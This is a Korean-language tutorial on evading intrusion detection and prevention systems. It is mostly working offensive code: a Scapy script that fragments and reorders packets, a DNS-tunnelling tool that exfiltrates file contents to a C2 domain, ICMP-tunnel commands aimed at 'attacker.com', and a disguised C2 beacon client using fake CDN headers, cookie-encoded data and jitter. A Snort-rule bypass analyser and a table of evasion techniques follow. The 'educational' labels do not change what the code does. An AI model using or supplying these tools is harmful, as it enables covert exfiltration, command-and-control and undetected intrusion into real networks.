# IDS/IPS 우회 — 패킷 조작·프로토콜 혼용·트래픽 분석

## 1. IDS/IPS 탐지 메커니즘

| 탐지 방식 | 설명 |
|-----------|------|
| 시그니처 기반 | 알려진 공격 패턴 (Snort 룰) |
| 이상 탐지 | 정상 트래픽 기준선에서 이탈 |
| 프로토콜 분석 | RFC 위반 탐지 |
| 행동 분석 | 연결 패턴·빈도 분석 |
| 상태 기반 | TCP 세션 상태 추적 |

---

## 2. 패킷 단편화 우회

```python
#!/usr/bin/env python3
"""패킷 단편화로 IDS 시그니처 분할 (교육용 — Scapy 기반)."""

import argparse
from scapy.all import IP, TCP, fragment, send, Raw


def send_fragmented_payload(
    dst_ip: str,
    dst_port: int,
    payload: bytes,
    fragment_size: int = 8,
    src_ip: str = "0.0.0.0",
) -> None:
    """페이로드를 작은 IP 단편으로 분할해 IDS 시그니처 탐지 회피."""
    pkt = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=54321, flags="PA") / Raw(load=payload)
    fragments = fragment(pkt, fragsize=fragment_size)
    print(f"[*] {len(fragments)}개 단편으로 분할 (단편 크기: {fragment_size} bytes)")
    send(fragments, verbose=False)
    print(f"[+] 전송 완료: {len(payload)} bytes → {dst_ip}:{dst_port}")


def send_out_of_order(
    dst_ip: str,
    dst_port: int,
    payload: bytes,
) -> None:
    """TCP 세그먼트를 역순으로 전송 — 일부 IDS 재조합 우회."""
    from scapy.all import RandShort

    chunk_size = len(payload) // 3
    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]

    sport = int(RandShort())
    seq = 1000

    # 역순 전송 (마지막 → 처음)
    for i, chunk in enumerate(reversed(chunks)):
        offset = len(payload) - (i + 1) * chunk_size
        pkt = IP(dst=dst_ip) / TCP(
            dport=dst_port, sport=sport,
            seq=seq + offset, flags="PA"
        ) / Raw(load=chunk)
        send(pkt, verbose=False)

    print(f"[+] {len(chunks)}개 세그먼트 역순 전송 완료")


def main() -> None:
    parser = argparse.ArgumentParser(description="패킷 단편화 IDS 우회 (교육용)")
    parser.add_argument("dst_ip", help="대상 IP")
    parser.add_argument("dst_port", type=int, help="대상 포트")
    parser.add_argument("payload", help="전송할 페이로드 (문자열)")
    parser.add_argument("--fragment-size", type=int, default=8, help="단편 크기 (bytes)")
    parser.add_argument("--out-of-order", action="store_true", help="역순 전송")
    args = parser.parse_args()

    payload = args.payload.encode()
    if args.out_of_order:
        send_out_of_order(args.dst_ip, args.dst_port, payload)
    else:
        send_fragmented_payload(args.dst_ip, args.dst_port, payload, args.fragment_size)


if __name__ == "__main__":
    main()
```

---

## 3. 프로토콜 터널링

### 3.1 DNS 터널링

```python
#!/usr/bin/env python3
"""DNS 터널링 — 데이터를 DNS 쿼리에 인코딩 (교육용)."""

import argparse
import base64
import socket
import struct
from pathlib import Path


def encode_data_as_dns_label(data: bytes) -> list[str]:
    """데이터를 DNS 레이블로 인코딩 (63자 제한)."""
    encoded = base64.b32encode(data).decode().lower().rstrip("=")
    return [encoded[i:i+60] for i in range(0, len(encoded), 60)]


def build_dns_query(hostname: str, qtype: int = 1) -> bytes:
    """DNS 쿼리 패킷 생성."""
    transaction_id = 0x1234
    flags = 0x0100  # 재귀 쿼리
    qdcount = 1

    header = struct.pack(">HHHHHH", transaction_id, flags, qdcount, 0, 0, 0)

    # 호스트명 인코딩
    labels = b""
    for part in hostname.split("."):
        labels += bytes([len(part)]) + part.encode()
    labels += b"\x00"

    question = labels + struct.pack(">HH", qtype, 1)  # A 레코드, IN 클래스
    return header + question


def dns_exfil(data: bytes, domain: str, dns_server: str = "8.8.8.8") -> int:
    """DNS 쿼리를 통한 데이터 유출 시뮬레이션."""
    labels = encode_data_as_dns_label(data)
    sent_chunks = 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    for i, label in enumerate(labels):
        hostname = f"{label}.chunk{i}.{domain}"
        query = build_dns_query(hostname)
        try:
            sock.sendto(query, (dns_server, 53))
            sent_chunks += 1
        except OSError:
            pass

    sock.close()
    return sent_chunks


def main() -> None:
    parser = argparse.ArgumentParser(description="DNS 터널링 시뮬레이터 (교육용)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    exfil_p = sub.add_parser("exfil", help="DNS를 통한 데이터 유출 시뮬레이션")
    exfil_p.add_argument("data", help="유출할 데이터 (문자열) 또는 파일 경로")
    exfil_p.add_argument("domain", help="C2 도메인")
    exfil_p.add_argument("--dns", default="127.0.0.1", help="DNS 서버")

    encode_p = sub.add_parser("encode", help="데이터 DNS 레이블 인코딩")
    encode_p.add_argument("data")
    encode_p.add_argument("domain")

    args = parser.parse_args()

    match args.cmd:
        case "exfil":
            if Path(args.data).exists():
                data = Path(args.data).read_bytes()
            else:
                data = args.data.encode()

            print(f"[*] {len(data)} bytes → DNS 쿼리로 분할")
            chunks = dns_exfil(data, args.domain, args.dns)
            print(f"[+] {chunks}개 DNS 쿼리 전송 완료")

        case "encode":
            labels = encode_data_as_dns_label(args.data.encode())
            for i, label in enumerate(labels):
                print(f"{label}.chunk{i}.{args.domain}")


if __name__ == "__main__":
    main()
```

### 3.2 ICMP 터널링

```bash
# icmptunnel — ICMP 페이로드에 TCP/IP 캡슐화
# 서버 (공격자 측)
icmptunnel -s

# 클라이언트 (피해자 측)
icmptunnel -c attacker.com

# ptunnel-ng — ICMP 기반 SSH 터널
ptunnel-ng -r attacker.com -rp 22 -lp 2222  # 클라이언트
ptunnel-ng -x PASSWORD  # 서버
ssh user@localhost -p 2222
```

---

## 4. 트래픽 위장 기법

```python
#!/usr/bin/env python3
"""C2 트래픽을 합법적 트래픽으로 위장 — HTTP 말라리아킷 스타일."""

import argparse
import base64
import json
import random
import time
from datetime import datetime

import httpx


# 정상 트래픽 위장을 위한 User-Agent 목록
LEGITIMATE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

# CDN 위장 헤더
CDN_HEADERS = {
    "CF-Cache-Status": "MISS",
    "CF-Ray": f"{random.randint(0, 0xFFFFFFFF):08x}-ICN",
    "X-Cache": "Miss from cloudfront",
    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
}


def encode_c2_data(data: dict) -> str:
    """C2 데이터를 무해해 보이는 Cookie 형식으로 인코딩."""
    raw = json.dumps(data).encode()
    encoded = base64.urlsafe_b64encode(raw).decode()
    # 쿠키 형식으로 위장
    return f"session_id={encoded[:32]}; _ga=GA1.2.{random.randint(1000000, 9999999)}.{int(time.time())}"


def decode_c2_data(cookie: str) -> dict | None:
    """위장된 쿠키에서 C2 데이터 추출."""
    try:
        session_part = [p for p in cookie.split(";") if "session_id=" in p]
        if not session_part:
            return None
        encoded = session_part[0].split("=", 1)[1].strip()
        raw = base64.urlsafe_b64decode(encoded + "==")
        return json.loads(raw)
    except Exception:
        return None


def jitter_sleep(base_seconds: float, jitter_pct: float = 0.3) -> None:
    """지터를 추가한 슬립 — 규칙적 비콘 탐지 방지."""
    jitter = base_seconds * jitter_pct * random.uniform(-1, 1)
    time.sleep(max(0, base_seconds + jitter))


class C2Client:
    def __init__(
        self,
        c2_url: str,
        beacon_interval: float = 60.0,
    ) -> None:
        self.c2_url = c2_url
        self.beacon_interval = beacon_interval
        self.session_id = base64.urlsafe_b64encode(
            random.randbytes(16)
        ).decode().rstrip("=")

    def beacon(self, command_output: str | None = None) -> dict | None:
        headers = {
            "User-Agent": random.choice(LEGITIMATE_USER_AGENTS),
            "Cookie": encode_c2_data({
                "sid": self.session_id,
                "ts": datetime.now().isoformat(),
                "output": command_output or "",
            }),
            **CDN_HEADERS,
        }

        try:
            with httpx.Client(verify=False) as client:
                resp = client.get(
                    self.c2_url,
                    headers=headers,
                    timeout=15,
                    follow_redirects=True,
                )
                if resp.status_code == 200:
                    return decode_c2_data(resp.headers.get("Set-Cookie", ""))
        except httpx.RequestError:
            pass

        return None

    def run(self, max_beacons: int = 10) -> None:
        print(f"[*] C2 비콘 시작 (간격: {self.beacon_interval}s, 지터: 30%)")
        for i in range(max_beacons):
            print(f"[*] 비콘 #{i+1} → {self.c2_url}")
            result = self.beacon()
            if result:
                print(f"[+] 명령 수신: {result}")
            jitter_sleep(self.beacon_interval)


def main() -> None:
    parser = argparse.ArgumentParser(description="트래픽 위장 C2 시뮬레이터 (교육용)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    beacon_p = sub.add_parser("beacon", help="C2 비콘 시뮬레이션")
    beacon_p.add_argument("url", help="C2 서버 URL")
    beacon_p.add_argument("--interval", type=float, default=60.0)
    beacon_p.add_argument("--count", type=int, default=5)

    encode_p = sub.add_parser("encode", help="데이터 인코딩")
    encode_p.add_argument("data", help="인코딩할 JSON 데이터")

    args = parser.parse_args()

    match args.cmd:
        case "beacon":
            client = C2Client(args.url, args.interval)
            client.run(args.count)
        case "encode":
            data = json.loads(args.data)
            print(encode_c2_data(data))


if __name__ == "__main__":
    main()
```

---

## 5. Snort 룰 우회 분석

```python
#!/usr/bin/env python3
"""Snort/Suricata 룰 분석 — 우회 가능 패턴 탐지."""

import argparse
import re
from dataclasses import dataclass
from pathlib import Path


@dataclass
class SnortRule:
    action: str
    protocol: str
    src: str
    dst: str
    options: dict[str, str]
    raw: str


def parse_snort_rule(line: str) -> SnortRule | None:
    """Snort 룰 파싱."""
    pattern = re.compile(
        r'(alert|drop|pass|reject)\s+(tcp|udp|icmp|ip)\s+'
        r'(\S+)\s+(\S+)\s+->\s+(\S+)\s+(\S+)\s+\((.+)\)'
    )
    m = pattern.match(line.strip())
    if not m:
        return None

    options_str = m.group(7)
    options: dict[str, str] = {}
    for opt in options_str.split(";"):
        opt = opt.strip()
        if ":" in opt:
            k, v = opt.split(":", 1)
            options[k.strip()] = v.strip().strip('"')
        elif opt:
            options[opt] = ""

    return SnortRule(
        action=m.group(1),
        protocol=m.group(2),
        src=f"{m.group(3)} {m.group(4)}",
        dst=f"{m.group(5)} {m.group(6)}",
        options=options,
        raw=line,
    )


def analyze_bypass_potential(rule: SnortRule) -> list[str]:
    """룰 우회 가능 벡터 분석."""
    bypasses = []
    content = rule.options.get("content", "")
    nocase = "nocase" in rule.options

    if content and not nocase:
        bypasses.append(f"대소문자 우회: content='{content}' nocase 미적용")

    if "depth" not in rule.options and content:
        bypasses.append("depth 미지정 — 오프셋 조작으로 우회 가능")

    if "flow" not in rule.options:
        bypasses.append("flow 미지정 — 요청/응답 방향 우회 가능")

    if rule.protocol == "tcp" and "flags" not in rule.options:
        bypasses.append("TCP 플래그 미지정 — 비표준 플래그로 우회 가능")

    pcre = rule.options.get("pcre", "")
    if pcre and "/i" not in pcre:
        bypasses.append(f"PCRE 대소문자 무시 미적용: {pcre}")

    return bypasses


def main() -> None:
    parser = argparse.ArgumentParser(description="Snort 룰 우회 분석")
    parser.add_argument("rules_file", type=Path, help="Snort 룰 파일")
    parser.add_argument("--keyword", help="특정 키워드 필터")
    args = parser.parse_args()

    rules = args.rules_file.read_text(encoding="utf-8", errors="ignore").splitlines()
    parsed_rules = []

    for line in rules:
        if line.strip().startswith("#") or not line.strip():
            continue
        rule = parse_snort_rule(line)
        if rule:
            parsed_rules.append(rule)

    print(f"[*] {len(parsed_rules)}개 룰 파싱 완료")

    if args.keyword:
        parsed_rules = [r for r in parsed_rules if args.keyword.lower() in r.raw.lower()]

    for rule in parsed_rules:
        bypasses = analyze_bypass_potential(rule)
        if bypasses:
            sid = rule.options.get("sid", "?")
            msg = rule.options.get("msg", "")
            print(f"\n[!] SID {sid}: {msg}")
            for b in bypasses:
                print(f"  → {b}")


if __name__ == "__main__":
    main()
```

---

## 6. IDS/IPS 우회 요약

| 기법 | 대상 IDS 유형 | 탐지 어려움 이유 |
|------|--------------|-----------------|
| IP 단편화 | 시그니처 기반 | 시그니처 분산 |
| TCP 세그먼트 겹침 | 상태 추적 | 재조합 정책 차이 |
| 유니코드/인코딩 | 시그니처 기반 | 문자셋 정규화 우회 |
| 프로토콜 터널링 | 포트 기반 | 정상 포트 사용 |
| 암호화 트래픽 | 페이로드 기반 | TLS 내용 불가시 |
| 슬로우 스캔 | 이상 탐지 | 기준선 내 수준 |
| 소스 IP 분산 | 횟수 기반 | IP당 임계치 미달 |
